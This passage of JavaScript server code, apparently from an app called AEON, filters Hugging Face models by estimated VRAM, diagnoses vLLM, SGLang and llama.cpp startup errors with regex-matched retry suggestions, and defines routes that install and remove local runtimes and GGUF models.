        const paramMatch = repoId.match(/[-_/](\d+(?:\.\d+)?)\s*[Bb](?![a-zA-Z])/);
        const paramsB = paramMatch ? parseFloat(paramMatch[1]) : null;
        const estVram = paramsB ? paramsB * 2.0 : null;
        const neededVram = estVram ? estVram * 1.3 : null;

        if (vramGb > 0 && neededVram && neededVram > vramGb) continue;

        models.push({
          repo_id: repoId,
          downloads: entry.downloads || 0,
          likes: entry.likes || 0,
          createdAt: entry.createdAt || '',
          tags: tags.slice(0, 5),
          pipeline_tag: entry.pipeline_tag || '',
          est_vram_gb: estVram ? Math.round(estVram * 10) / 10 : null,
          needed_vram_gb: neededVram ? Math.round(neededVram * 10) / 10 : null,
        });
        if (models.length >= 50) break;
      }

      hfLatestCache = { models, ts: Date.now() };
      res.json({ models: models.slice(0, limit) });
    } catch (e) {
      res.json({ models: [], error: e.message });
    }
  });

  // ── Error Diagnosis ────────────────────────────────────────────

  function diagnoseOutput(text) {
    if (!text) return null;
    const tail = text.slice(-6000);
    const patterns = [
      [
        /No available memory for the cache blocks|Available KV cache memory:.*-/i,
        'No GPU memory left for KV cache after loading model.',
        [
          { label: 'Retry with GPU memory utilization 0.95', op: 'replace', flag: '--gpu-memory-utilization', value: '0.95' },
          { label: 'Retry with context 2048', op: 'replace', flag: '--max-model-len', value: '2048' },
        ],
      ],
      [
        /CUDA out of memory|torch\.cuda\.OutOfMemoryError|CUDA error: out of memory|warming up sampler|max_num_seqs.*gpu_memory_utilization/i,
        'GPU ran out of memory during startup or warmup.',
        [
          { label: 'Retry with context 4096', op: 'replace', flag: '--max-model-len', value: '4096' },
          { label: 'Retry with GPU memory utilization 0.80', op: 'replace', flag: '--gpu-memory-utilization', value: '0.80' },
          { label: 'Retry with --enforce-eager', op: 'append', arg: '--enforce-eager' },
        ],
      ],
      [
        /not divisib|must be divisible|attention heads.*divisible/i,
        'Tensor parallel size is incompatible with the model.',
        [
          { label: 'Retry with tensor parallel size 1', op: 'replace', flag: '--tensor-parallel-size', value: '1' },
          { label: 'Retry with tensor parallel size 2', op: 'replace', flag: '--tensor-parallel-size', value: '2' },
        ],
      ],
      [
        /KV cache.*too (small|large)|max_model_len.*exceeds|maximum.*context/i,
        'Context length is too large for available GPU memory.',
        [
          { label: 'Retry with context 8192', op: 'replace', flag: '--max-model-len', value: '8192' },
          { label: 'Retry with context 4096', op: 'replace', flag: '--max-model-len', value: '4096' },
        ],
      ],
      [
        /enable-auto-tool-choice requires --tool-call-parser/i,
        'Auto tool choice requires an explicit tool call parser.',
        [{ label: 'Retry with Hermes tool parser', op: 'append', arg: '--tool-call-parser hermes' }],
      ],
      [
        /Please pass.*trust.remote.code=True|contains custom code which must be executed|does not recognize this architecture|model type.*but Transformers does not/i,
        'Model requires custom code or newer model support.',
        [{ label: 'Retry with --trust-remote-code', op: 'append', arg: '--trust-remote-code' }],
      ],
      [
        /Either a revision or a version must be specified|transformers\.integrations\.hub_kernels|kernels\/layer/i,
        'vLLM/Transformers kernel package mismatch.',
        [{ label: 'Update vLLM, Transformers, and kernels', op: 'dependency', package: 'vllm transformers kernels' }],
      ],
      [
        /Address already in use|bind.*address.*in use/i,
        'Port is already in use.',
        [{ label: 'Retry on port 8001', op: 'replace', flag: '--port', value: '8001' }],
      ],
      [
        /No CUDA GPUs are available|no GPU.*found|CUDA_VISIBLE_DEVICES.*invalid/i,
        'No GPUs are visible to the serve process.',
        [{ label: 'Clear GPU selection or choose available GPUs', op: 'settings', field: 'gpus', value: '' }],
      ],
      [
        /Failed to infer device type|NVML Shared Library Not Found|No module named 'amdsmi'|platform is not available/i,
        'vLLM could not find a supported GPU (CUDA or ROCm). This machine may have integrated or unsupported graphics only.',
        [{ label: 'Switch to llama.cpp (CPU/Metal)', op: 'manual' }],
      ],
      [
        /vllm.*command not found|No module named vllm|ERROR: vLLM is not installed/i,
        'vLLM is not installed or not in PATH.',
        [{ label: 'pip install vllm', op: 'dependency', package: 'vllm' }],
      ],
      [
        /sglang.*command not found|No module named sglang|SGLang is not installed/i,
        'SGLang is not installed or not in PATH.',
        [{ label: 'pip install sglang[all]', op: 'dependency', package: 'sglang[all]' }],
      ],
      [
        /llama-server.*command not found|llama\.cpp.*not found|No module named.*llama_cpp|No module named 'starlette_context'|git: command not found|cmake: command not found/i,
        'llama.cpp / llama-cpp-python is not installed — installing it requires a C/C++ compiler (Visual Studio Build Tools on Windows, Xcode Command Line Tools on Mac).',
        [{ label: 'pip install llama-cpp-python[server] (requires a C/C++ compiler already installed)', op: 'dependency', package: 'llama-cpp-python[server]' }],
      ],
      [
        /No GGUF found on this host|no \.gguf file|No GGUF file found/i,
        'No GGUF file found for this model. The llama.cpp backend needs a .gguf file.',
        [{ label: 'Download a GGUF build (repo ending in -GGUF, file like Q4_K_M.gguf)', op: 'manual' }],
      ],
      [
        /No module named 'torch'|No module named torch|No module named 'diffusers'|No module named diffusers/i,
        'Diffusion serving requires PyTorch and diffusers.',
        [{ label: 'pip install diffusers[torch]', op: 'dependency', package: 'diffusers[torch]' }],
      ],
      [
        /403 Forbidden|401 Unauthorized|Access to model.*is restricted|gated repo|not in the authorized list|awaiting a review/i,
        'Model access is gated or unauthorized.',
        [{ label: 'Set HF token and request model access on HuggingFace', op: 'manual' }],
      ],
      [
        /No space left on device/i,
        'Disk full.',
        [{ label: 'Free disk space or change download directory', op: 'manual' }],
      ],
      [
        /ConnectionResetError|SSLError|SSL: DECRYPTION_FAILED_OR_BAD_RECORD_MAC/i,
        'Network error during download — connection reset or SSL failure.',
        [{ label: 'Retry download (resume should pick up where it left off)', op: 'manual' }],
      ],
    ];
    for (const [re, msg, suggestions] of patterns) {
      if (re.test(tail)) return { message: msg, suggestions };
    }
    if (/Traceback \(most recent call last\)/i.test(tail) &&
        !/Application startup complete|GET \/v1\/|Uvicorn running on/i.test(tail)) {
      return {
        message: 'Python traceback detected during serve startup.',
        suggestions: [{ label: 'Inspect traceback and retry with adjusted settings', op: 'manual' }],
      };
    }
    return null;
  }

  // ── Helpers ────────────────────────────────────────────────────

  function findExecutable(name) {
    try {
      const result = execFileSync('where', [name], { timeout: 3000, windowsHide: true, encoding: 'utf8' });
      const first = result.split('\n')[0].trim();
      return first || null;
    } catch { return null; }
  }

  // findBash() was removed with the last `bash -c` call site. It hardcoded two
  // Git-for-Windows install paths and existed only to give /model/serve "full
  // command compatibility" — i.e. a shell, which was the vulnerability. Nothing
  // in AEON needs bash.

  // ── Phase 8: runtime installer (llama.cpp binary) ────────────────────────
  const runtimeInstaller = (() => {
    try { return require(path.join(__dirname, '..', '..', '..', '..', 'services', 'local-runtime', 'runtime-installer.cjs')); }
    catch { return null; }
  })();

  if (runtimeInstaller) {
    // POST /cookbook/local/install-runtime — download + verify + register llama.cpp binary
    router.post('/cookbook/local/install-runtime', async (req, res) => {
      const preferBackend = req.body?.preferBackend || process.env.AEON_LLM_BACKEND || 'cpu';
      try {
        const { getLocalRuntimeRegistry } = deps;
        const reg = getLocalRuntimeRegistry ? getLocalRuntimeRegistry() : null;
        // reg.file is <dataRoot>/local-runtime/local-runtime.json — two levels
        // up, not three. Three resolved to the app root, so the runtime landed
        // outside data/ where lr.status() would never look for it: the install
        // reported success and the model stayed invisible.
        const dataRoot = reg ? path.resolve(reg.file, '..', '..') : null;
        if (!dataRoot) return res.status(500).json({ ok: false, error: 'registry unavailable' });

        const sessionId = `lr-install-${Date.now()}`;
        res.json({ ok: true, session_id: sessionId, status: 'installing' });

        activeTasks[sessionId] = {
          type: 'runtime-install', status: 'running', query: `llama.cpp (${preferBackend})`,
          started_at: Date.now(), pid: null, pct: 0,
        };
        runtimeInstaller.installRuntime({
          dataRoot,
          preferBackend,
          onStatus: (msg) => { if (activeTasks[sessionId]) activeTasks[sessionId].log = msg; },
          onProgress: (pct) => { if (activeTasks[sessionId]) activeTasks[sessionId].pct = pct; },
        }).then((r) => {
          console.log(`[LOCAL RUNTIME] Install complete: ${r && r.runtimeId ? r.runtimeId : preferBackend}`);
          if (activeTasks[sessionId]) { activeTasks[sessionId].status = 'done'; activeTasks[sessionId].pct = 100; }
        }).catch((e) => {
          // R-05: the failure was written only into an in-memory task map — not
          // logged, not surfaced by /cookbook/local/status. A user clicked
          // Install, it failed, and nothing anywhere said so.
          console.error(`[LOCAL RUNTIME] Install FAILED (${preferBackend}): ${e.message}`);
          if (activeTasks[sessionId]) { activeTasks[sessionId].status = 'error'; activeTasks[sessionId].error = e.message; }
        });
      } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
      }
    });
  }

  // ── Phase 4: native GGUF model catalog + installer ────────────────────────
  // These routes are the Phase 4 public API. They do NOT use any legacy daemon.
  // The model installer uses the registry from Phase 2 and the catalog from
  // services/local-runtime/model-catalog.json.
  const modelInstaller = (() => {
    try { return require(path.join(__dirname, '..', '..', '..', '..', 'services', 'local-runtime', 'model-installer.cjs')); }
    catch { return null; }
  })();

  if (modelInstaller) {
    // GET /cookbook/local/catalog — list catalog with install state
    router.get('/cookbook/local/catalog', (req, res) => {
      try {
        const { getLocalRuntimeRegistry } = deps;
        const reg = getLocalRuntimeRegistry ? getLocalRuntimeRegistry() : null;
        const dataRoot = reg ? path.dirname(path.dirname(reg.file || '')) : null;
        res.json({ ok: true, models: modelInstaller.listCatalog(dataRoot || '') });
      } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
      }
    });

    // POST /cookbook/local/install — start model download
    // Body: { modelId: string }
    router.post('/cookbook/local/install', async (req, res) => {
      const modelId = req.body?.modelId;
      if (!modelId || typeof modelId !== 'string') {
        return res.status(400).json({ ok: false, error: 'modelId required' });
      }

      const { getLocalRuntimeRegistry } = deps;
      const reg = getLocalRuntimeRegistry ? getLocalRuntimeRegistry() : null;
      if (!reg || !reg.file) {
        return res.status(503).json({ ok: false, error: 'Local runtime registry not available' });
      }
      // Two levels up, not three — same off-by-one the runtime route had. Three
      // resolved to the app root, so the model downloaded and verified fine but
      // landed outside data/ where readyModels() never looks: the install said
      // OK and the model stayed invisible forever.
      const dataRoot = path.resolve(reg.file, '..', '..');

      const sessionId = `local-install-${crypto.randomBytes(4).toString('hex')}`;
      const logFile = path.join(LOGS_DIR, `${sessionId}.log`);
      const logStream = fs.createWriteStream(logFile, { flags: 'a' });

      // Register as a task. Previously the model installer wrote only to a log
      // file: /cookbook/local/status filters on type === 'runtime-install', so a
      // MODEL install's progress and failures never reached any status route.
      // The console line existed; nothing the UI polls could see it.
      activeTasks[sessionId] = {
        type: 'model-install', status: 'running', query: modelId,
        started_at: Date.now(), logFile, pct: 0, log: null, error: null,
      };

      res.json({ ok: true, session_id: sessionId });

      modelInstaller.installModel({
        dataRoot,
        modelId,
        onStatus: (msg) => {
          logStream.write(`[STATUS] ${msg}\n`);
          const t = activeTasks[sessionId];
          if (t) t.log = msg;
          if (typeof global.broadcastTerminalEvent === 'function') {
            global.broadcastTerminalEvent('LOCAL_MODEL_INSTALL', `[${modelId}] ${msg}`);
          }
        },
        onProgress: (pct) => {
          logStream.write(`[PROGRESS] ${pct}%\n`);
          const t = activeTasks[sessionId];
          if (t) t.pct = pct;
        },
      }).then(() => {
        console.log(`[LOCAL MODEL] Install complete: ${modelId}`);
        logStream.write('LOCAL_MODEL_INSTALL_OK\n');
        logStream.end();
        const t = activeTasks[sessionId];
        if (t) { t.status = 'done'; t.pct = 100; }
      }).catch(e => {
        // R-05: the outcome only ever reached a per-session log file on disk.
        // Nothing on the console, nothing in any status route — a failed model
        // install looked identical to one that never started.
        console.error(`[LOCAL MODEL] Install FAILED (${modelId}): ${e.message}`);
        logStream.write(`ERROR: ${e.message}\nLOCAL_MODEL_INSTALL_FAILED\n`);
        logStream.end();
        const t = activeTasks[sessionId];
        if (t) { t.status = 'error'; t.error = e.message; }
      });
    });

    // DELETE /cookbook/local/model/:modelId — remove an installed model
    router.delete('/cookbook/local/model/:modelId', async (req, res) => {
      const { modelId } = req.params;
      const { getLocalRuntimeRegistry } = deps;
      const reg = getLocalRuntimeRegistry ? getLocalRuntimeRegistry() : null;
      if (!reg || !reg.file) {
        return res.status(503).json({ ok: false, error: 'Local runtime registry not available' });
      }
      // Two levels up. With three, delete pointed at the app root and could
      // never find the model it was asked to remove — so uninstall silently
      // freed nothing while the real file stayed on disk.
      const dataRoot = path.resolve(reg.file, '..', '..');
      try {
        await modelInstaller.removeModel(dataRoot, modelId);
        res.json({ ok: true });
      } catch (e) {
        res.status(400).json({ ok: false, error: e.message });
      }
    });

    // GET /cookbook/local/status — active runtime + ready model count
    router.get('/cookbook/local/status', (req, res) => {
      const { getLocalRuntimeRegistry } = deps;
      const reg = getLocalRuntimeRegistry ? getLocalRuntimeRegistry() : null;
      if (!reg) return res.json({ ok: true, runtimeReady: false, readyModels: 0 });
      try {
        const active = reg.activeRuntime();
        const ready = reg.readyModels();
        // Surface the most recent runtime-install outcome. Without this a failed
        // install is invisible to the UI: the panel just keeps saying "not
        // installed" with no reason, which reads as the button doing nothing.
        const latest = (type) => {
          const runs = Object.entries(activeTasks)
            .filter(([, t]) => t && t.type === type)
            .sort((a, b) => (b[1].started_at || 0) - (a[1].started_at || 0));
          if (!runs.length) return null;
          const t = runs[0][1];
          return { status: t.status, pct: t.pct || 0, log: t.log || null, error: t.error || null, target: t.query || null };
        };
        const install = latest('runtime-install');
        // Model installs are reported too. Only the runtime's outcome used to
        // reach this route, so a failed MODEL install showed as "not installed"
        // with no reason — indistinguishable from never pressing the button.
        const modelInstall = latest('model-install');
        res.json({
          ok: true,
          runtimeReady: !!active,
          activeRuntime: active ? active.id : null,
          readyModels: ready.length,
          install,
          modelInstall,
          models: ready.map(m => ({ id: m.id, displayName: m.displayName, capabilities: m.capabilities })),
        });
      } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
      }
    });
  }

  return router;
};
